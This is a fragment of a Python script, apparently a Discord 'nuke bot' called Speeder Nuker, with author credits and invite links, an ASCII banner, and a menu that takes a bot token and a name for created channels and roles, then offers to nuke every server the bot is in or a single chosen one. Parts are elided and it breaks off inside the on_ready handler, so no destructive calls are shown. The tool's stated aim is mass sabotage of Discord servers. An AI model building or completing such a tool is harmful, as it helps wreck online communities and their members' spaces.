### Owner Of : JavorR
### Discord : discord.gg/5svtU4ysFa
### Owner Of Speeder Nuker : JavorR#8365
import discord
...
{b}██████╔╝██║░░░░░███████╗███████╗██████╔╝███████╗██║░░██║{c} ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
{b}╚═════╝░╚═╝░░░░░╚══════╝╚══════╝╚═════╝░╚══════╝╚═╝░░╚═╝{c} ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
{b}Made by: {c}discord.gg/jasBCwQq6m
{b}Made by: {c}https://github.com/JavorR1'''
...
{c}==============================================
{b}[Menu]
    {b}└─[1] {c}- {c}Setup Nuke Bot
    {b}└─[2] {r}- {r}Exit
{b}====>{c}''')
    if choice == '1':
        token = _input(f'{b}Input bot token:{c}')
        name = _input(f'{b}Input name for created channels / roles:{c}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}==============================================
{b}[Select]
    {b}└─[1] {c}- {c}Nuke of all servers.
    {b}└─[2] {c}- {c}Nuke only one server.  
    {b}└─[3] {r}- {r}Exit
{b}====>{c}''')
...
[+]Bot in {len(client.guilds)} servers!''')
            ...
            guild_id =  _input(f'{b}Input server id:{c}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
